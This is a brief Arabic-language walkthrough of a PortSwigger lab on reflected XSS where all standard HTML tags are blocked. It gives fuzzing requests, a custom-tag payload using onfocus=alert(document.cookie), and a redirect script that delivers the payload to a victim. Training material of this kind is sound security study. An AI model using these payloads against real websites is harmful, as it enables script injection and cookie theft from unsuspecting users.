# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

- الفكره من الLab ده ان الموقع بيحظر اغلب الtags ففي عدد قليل انت تعرفه بقا وتعمل payload وخلاص

```bash
1. GET /?search=<$$> HTTP/2 ==> علشان اعرف نهو الي هيمشي معايا  Tags هجرب كل ال

2. GET /?search=<body%20$$=1> HTTP/2 ==> الصح الي هيشتغل معايا Eventالصح المفروض نعرف دالوقتي ال Tagكدا عرفنا ال

3. <xss id=x onfocus=alert(document.cookie) tabindex=1>#x';

4. <script>
location = 'https://0a7e00b103a0c800809003a600d600fd.web-security-academy.net//?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
